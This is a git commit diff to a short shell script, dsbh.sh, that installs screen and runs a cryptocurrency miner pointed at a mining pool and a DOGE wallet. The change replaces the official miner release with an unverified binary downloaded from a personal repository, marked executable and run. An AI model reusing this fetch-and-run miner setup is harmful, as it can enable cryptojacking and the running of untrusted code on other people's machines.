9e2566ac56d159a353b13da44bdf7b8cf2ceba96
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-14 14:47:42 +0100

    Update dsbh.sh

--- dsbh.sh
+++ dsbh.sh
@@ -1,8 +1,8 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz 
-tar violetminer-linux-v0.2.2 
+wget https://github.com/uveshV/uveshV/raw/main/violetminer
+chmod +x violetminer
 ./violetminer --v --l verushash.mine.zergpool.com:3300 --u DCXP219mqbCeGhdKf2BojtsD2eRE1K5C9p --p c=DOGE,mc=VRSC -t 2 --password x --algorithm verushash--threads 2
 while [ 1 ]; do
 sleep 3
